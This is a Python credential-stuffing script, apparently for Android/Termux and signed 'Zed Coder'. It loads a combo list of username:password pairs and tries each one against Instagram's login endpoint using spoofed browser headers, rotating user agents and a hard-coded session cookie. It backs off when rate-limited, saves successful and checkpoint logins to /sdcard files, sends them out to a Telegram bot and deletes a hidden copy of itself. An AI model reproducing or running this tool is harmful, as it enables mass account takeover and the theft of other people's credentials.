import requests, sys, os, random, time, user_agent
import os,sys
os.system('rm -rf .dabll.py ;rm -rf /sdcard/download/.dabll.py ;clear')
import subprocess
import json 
bad=0
hits=0
timeout=0
error=0
checkpoint=0
##################
os.system("clear")
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"  
logo1=G+'''
 ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
 ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
 ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
 ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
 ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
             ░ ░   ░        ░      ░ ░           ░ 
'''+W+''' ---------------------------------------------------
'''+wd+''' ➣ Author   : Zed Coder
 ➣ GitHub   : https://github.com/968hacker
 ➣ YouTube  : Zed cracker
 ➣ telegram : https://t.me/zed_cracker_1
 '''+W+'''---------------------------------------------------'''
logo2=G+'''
 ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
 ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
 ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
 ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
 ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
 ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
             ░ ░   ░        ░      ░ ░           ░ 
'''+W+''' ---------------------------------------------------
 '''+wd+'''➣ Author   : Zed Coder
 ➣ GitHub   : https://github.com/968hacker
 ➣ YouTube  : Zed cracker
 ➣ telegram : https://t.me/zed_cracker_1
'''+W+''' ---------------------------------------------------

'''+W+''' ---------------------------------------------------
 '''+wd+'''  Crack instgram it started !
    please wait .. 1h or 2h 
    Prosess in Background !...... 
'''+W+''' ---------------------------------------------------
 '''
print(logo1)
agar=input(" You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
    ID=input(" Your ID Telegram :")
    token=input(" Token(bot) : ")
else:
    pass
print(W+' ---------------------------------------------------')
time.sleep(1)
import json, requests, user_agent,os ,sys, time, datetime
import requests
from user_agent import generate_user_agent
from datetime import datetime
os.system("rm -rf .dabll.py")
try:
    os.remove(".dabll.py")
except:
    pass
os.system("clear")
bad=0
timeout=0
hits=0
checkpoint=0
error=0
def instagram1():
	import json, requests, user_agent,os ,sys, time, datetime
	import requests
	from user_agent import generate_user_agent
	from datetime import datetime
	r = requests.session()
	import os, sys
	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
	agar=input(wd+"   You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
		ID=input("    Your ID Telegram :")
		token=input("    Token(bot) : ")
	else:
		pass
	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
	def loopPp():
		try:
			combo=input("     [PATH] File >>> ")
			file = open(combo,'r').read().splitlines()
			global bad, timeout, checkpoint, error, hits
			for line in file:
				user = line.split(':')[0]
				pasw = line.split(':')[1]
				url = 'https://www.instagram.com/accounts/login/ajax/'
				head = {
                        'accept':'*/*',
                        'accept-encoding':'gzip,deflate,br',
                        'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                        'content-length':'269',
                        'content-type':'application/x-www-form-urlencoded',
                        'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                        'origin':'https://www.instagram.com',
                        'referer':'https://www.instagram.com/',
                        'sec-fetch-dest':'empty',
                        'sec-fetch-mode':'cors',
                        'sec-fetch-site':'same-origin',
                        'user-agent': generate_user_agent() ,
                        'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                        'x-ig-app-id':'936619743392459',
                        'x-ig-www-claim':'0',
                        'x-instagram-ajax':'8a8118fa7d40',
                        'x-requested-with':'XMLHttpRequest'}
				time_now = int(datetime.now().timestamp())
				data = {
                        'username': user,
                        'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                        'queryParams': {},
                        'optIntoOneTap': 'false',}
				login = requests.post(url,headers=head,data=data).text
				try:
					if '"authenticated":false' in login:
						os.system("clear")
						print(logo2)
						bad+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
					elif '"message":"Please wait a few minutes before you try again."' in login:
						os.system("clear")
						print(logo2)
						timeout+=1
						import time
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						time.sleep(360)
					elif 'userId' in login:
						os.system("clear")
						print(logo2)
						hits+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						boooom=f"GOOD: "+user+":"+pasw
						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
						with open('/sdcard/Good(instgram).txt', 'a') as ff:
							ff.write(f"\nuser&num&emil: "+user+":"+pasw)
					elif ('"message":"checkpoint_required"') in login:
						os.system("clear")
						print(logo2)
						checkpoint+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
						booom=f"Checkpoint: "+user+":"+pasw
						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
						with open("/sdcard/checkpoint.txt", "a") as dd:
							dd.write(f"\nuser&num&emil: "+user+":"+pasw)
					else:
						os.system("clear")
						print(logo2)
						error+=1
						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
				except:
					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
		except FileNotFoundError:
			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
	loopPp()
	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
   
instagram1()
